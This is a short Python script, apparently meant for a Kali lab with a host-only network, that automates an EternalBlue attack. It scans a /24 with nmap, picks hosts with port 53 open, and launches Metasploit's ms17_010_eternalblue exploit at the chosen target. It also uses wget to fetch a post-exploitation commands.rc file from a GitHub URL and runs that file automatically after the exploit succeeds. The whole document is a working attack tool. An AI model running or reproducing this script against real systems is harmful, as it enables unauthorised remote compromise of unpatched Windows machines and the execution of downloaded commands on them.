import subprocess
import ipaddress
import os
import sys
DIR = "/home/kali/Desktop/temporarily_files"


def IpCheck(ip):
    try:
        check = ipaddress.ip_address(ip)
        return True
    except:
        return False

def loop(ip):
    while True:
        if(IpCheck(ip)):
            return True
        else:
            ip = input("Wrong IP format, try again\n")
            continue

def nmapScan(ip):
    global DIR
    subprocess.call(["clear"])
    subprocess.call(["nmap","-T5","-oG","%s/nmap_scan"%DIR,"%s/24"%ip])
    subprocess.call(["clear"])
    os.system("cat %s/nmap_scan | grep 'Ports: 53'| cut -d ' ' -f 2 | sort -u"%DIR )
    confirmT = input("\nYour target might be this [y/n]:\n")
    while(True):
       if (confirmT == "yes" or confirmT == "y" or confirmT == "Y"):
       	   ip_new = os.popen("cat %s/nmap_scan | grep 'Ports: 53'| cut -d ' ' -f 2 | sort -u"%DIR ).read()
           return ip_new
       elif (confirmT == "no" or confirmT == "n" or confirmT == "N"):
           subprocess.call(["clear"])
           subprocess.call(["cat","%s/nmap_scan"%DIR])
           ip_new = input("\n\nEnter manually your target's IP:\n")
           if (loop(ip_new)):
               return ip_new
       else:
           continue

def msfconsole(target, host):
	global DIR
	subprocess.call(["clear"])
	print("Starting attack ...to %s"%target)
	subprocess.call(["msfconsole", "-q", "-x", "use exploit/windows/smb/ms17_010_eternalblue; set RHOST %s; set LHOST %s; set AutoRunScript multi_console_command -r %s/commands.rc; exploit;"%(target,host,DIR)])
	sys.exit()

if __name__ == '__main__':

    if(os.path.isdir(DIR)):
        subprocess.call(["rm","-rf", DIR])
        subprocess.call(["mkdir", DIR])
    else:
        subprocess.call(["mkdir", DIR])

    subprocess.call(["wget", "-O", "%s/commands.rc" % DIR,
                     "https://raw.githubusercontent.com/M4rcus3000/metasplot-test/main/commands.rc"])

    subprocess.call(["clear"])


    network = input("Enter your network without mask. Example 0.0.0.0\n")


    if(loop(network)):
        subprocess.call(["clear"])
        subprocess.call(["ip","a"])
        ipt = input("\n\n\nEnter the name of the current Hots-Only network IP. Example: 0.0.0.0\n")
        if(loop(ipt)):
            startup = nmapScan(network)
            msfconsole(startup, ipt)    
